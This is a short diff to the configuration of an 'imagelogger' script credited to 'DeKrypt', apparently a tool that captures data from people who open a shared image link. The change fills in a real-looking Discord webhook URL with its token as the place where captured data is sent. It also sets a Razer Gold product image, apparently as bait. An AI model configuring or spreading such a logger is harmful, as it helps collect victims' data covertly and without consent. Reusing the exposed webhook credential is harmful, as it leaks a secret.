@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/webhooks/1351223688309248020/vJ4BaqOpxKF41jKAM_UVO2GK9_mxRtPvla-lUToRzqPIO5PFRQ4gCZ1o7385AfBD1d00",
     "image": "https://images-ext-1.discordapp.net/external/XsDlHDNdCY2bTSWtYcdZjdK0UNFreR2BW3_2I4U271I/https/recharge-prd.asset.akeneo.cloud/product_assets/media/recharge_com_razer_gold_product_card.png?format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
